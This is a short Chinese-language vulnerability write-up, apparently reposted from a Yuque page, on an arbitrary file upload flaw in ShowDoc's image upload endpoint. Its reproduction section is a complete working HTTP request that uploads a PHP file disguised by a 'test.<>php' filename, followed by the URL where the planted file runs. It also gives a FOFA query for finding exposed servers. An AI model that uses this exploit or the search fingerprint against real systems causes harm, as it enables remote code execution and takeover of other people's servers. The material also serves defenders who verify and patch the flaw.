# ShowDoc PageController存在任意文件上传漏洞

# 一、漏洞简介
ShowDoc是一个非常适合IT团队的在线文档分享工具，它可以加快团队之间沟通的效率。通过showdoc，你可以方便地使用markdown语法来书写出美观的API文档、数据字典文档、技术文档、在线excel文档等等。ShowDoc系统存在任意文件上传漏洞，攻击者可以通过上传恶意文件执行任意命令，获取服务器管理权限。

# 二、影响版本
+ ShowDoc

# 三、资产测绘
+ fofa`app="ShowDoc"`
+ 特征

![1717008909960-98ec294e-2aa1-4ed3-9e3e-77f5ccc28bb4.png](./img/8QZNWZkLqxGKi3s0/1717008909960-98ec294e-2aa1-4ed3-9e3e-77f5ccc28bb4-778686.png)

# 四、漏洞复现
```rust
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Content-Length: 241
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Accept-Encoding: gzip

----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php phpinfo();?>
----------------------------921378126371623762173617--
```

![1717009091618-d86139f0-fa88-44ba-b1b9-816399d8a831.png](./img/8QZNWZkLqxGKi3s0/1717009091618-d86139f0-fa88-44ba-b1b9-816399d8a831-156809.png)

```rust
http://127.0.0.1:8000/Public/Uploads/2024-05-30/66577ab51bb29.php
```

![1717009125691-f848e62e-6145-48a3-9008-d7129dd86854.png](./img/8QZNWZkLqxGKi3s0/1717009125691-f848e62e-6145-48a3-9008-d7129dd86854-508808.png)



> 更新: 2024-06-01 11:14:22  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tw1q4kmr0efcmd8m>